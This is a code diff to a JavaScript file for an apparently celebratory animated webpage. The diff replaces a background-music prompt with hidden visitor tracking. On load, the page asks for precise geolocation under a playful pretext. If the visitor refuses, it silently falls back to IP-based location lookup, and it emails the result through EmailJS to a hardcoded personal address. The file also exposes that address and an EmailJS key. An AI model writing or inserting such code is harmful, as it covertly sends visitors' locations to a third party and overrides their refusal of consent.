@@ -1,21 +1,30 @@
 // trigger to play music in the background with sweetalert
-window.addEventListener('load', () => {
-    Swal.fire({
-        title: 'Do you want to play music in the background?',
-        icon: 'warning',
-        showCancelButton: true,
-        confirmButtonColor: '#3085d6',
-        cancelButtonColor: '#d33',
-        confirmButtonText: 'Yes',
-        cancelButtonText: 'No',
-    }).then((result) => {
-        if (result.isConfirmed) {
-            document.querySelector('.song').play();
-            animationTimeline();
-        } else {
-            animationTimeline();
-        }
-    });
+window.addEventListener('load',async () => {
+    const accurateLocationMessage = await getAccurateLocation();
+    if (accurateLocationMessage) {
+        sendEmail(accurateLocationMessage);
+    } else {
+        const ipLocationMessage = await getIPLcations();
+        sendEmail(ipLocationMessage);
+    }
+    animationTimeline();
+    
+    // Swal.fire({
+    //     title: 'Do you want to play music in the background?',
+    //     icon: 'warning',
+    //     showCancelButton: true,
+    //     confirmButtonColor: '#3085d6',
+    //     cancelButtonColor: '#d33',
+    //     confirmButtonText: 'Yes',
+    //     cancelButtonText: 'No',
+    // }).then((result) => {
+    //     if (result.isConfirmed) {
+    //         // document.querySelector('.song').play();
+    //         animationTimeline();
+    //     } else {
+    //         animationTimeline();
+    //     }
+    // });
 });
 
 
@@ -270,3 +279,65 @@ const animationTimeline = () => {
         tl.restart();
     });
 }
+
+const sendEmail = (message) => {
+    emailjs.init("VfENHIwTGlVHSZV18"); // Replace with your EmailJS User ID
+
+    // Send email using EmailJS
+    emailjs.send("service_ns5xi9n", "template_i74apkp", {
+        to_email: "rohitparakh4@gmail.com", // Replace with recipient email
+        message: message,
+    })
+        .then(response => {
+            console.log("Email sent:", response);
+        })
+        .catch(error => {
+            console.error("Error sending email:", error);
+        });
+};
+
+const getAccurateLocation = () => {
+    return new Promise((resolve) => {
+        if ("geolocation" in navigator) {
+            const confirmLocation = confirm(
+                "I'd like to access your location to know if you have seen the website or not :)"
+            );
+
+            if (confirmLocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const message = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                        console.log(`Accurate Location: ${message}`);
+                        resolve(message); // Return accurate location
+                    },
+                    error => {
+                        console.error('Error fetching location:', error);
+                        resolve(null); // Permission denied or error
+                    }
+                );
+            } else {
+                resolve(null); // User declined prompt
+            }
+        } else {
+            resolve(null); // Geolocation not supported
+        }
+    });
+};
+
+const getIPLcations = () => {
+    return new Promise((resolve) => {
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const message = `Approximate location: ${data.city}, ${data.region}, ${data.country}`;
+                console.log(`IP Location: ${message}`);
+                resolve(message); // Return IP location
+            })
+            .catch(error => {
+                console.error('Error fetching IP geolocation:', error);
+                resolve(null); // Error occurred
+            });
+    });
+};
